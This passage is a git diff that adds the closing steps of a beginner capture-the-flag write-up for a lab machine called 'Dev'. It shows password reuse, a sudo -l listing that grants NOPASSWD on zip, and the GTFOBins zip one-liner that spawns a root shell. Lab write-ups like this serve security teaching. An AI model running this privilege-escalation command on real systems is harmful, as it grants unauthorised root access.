@@ -371,10 +371,36 @@ Now remember the `config.yml` file we found a password in that file `i_love_java
 
 And we are in !
 
-Now we can check what are the commands/operations this user can do as **root**. 
+Now we can check what are the commands/operations this user can do as **root** and without the need of a password. 
 
 ```
 sudo -l
 ```
+```
+User jeanpaul may run the following commands on dev:
+        (root) NOPASSWD: /usr/bin/zip
+```
 
-  
+Abuse the `zip` feature to be able for us to escalate into root.
+You can search for this in `GTFOBins` and i found [**this**](https://gtfobins.github.io/gtfobins/zip/)
+
+```
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+```
+Execute these one by one,and you'll get a shell !
+
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/b392e7ab1a2b7c1c5fc543d565f9a1eceb708cf4/Dev/images/ziponeliner.png)
+
+#### Flag
+
+![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/4efe2df55044a81c237825e6ffcbb3761da1f006/Dev/images/root%20flag.png)
+
+Had a lot of fun !
+learned lot of new things..
+
+Yep this is the end of the `Capstone challenges` !
+
+
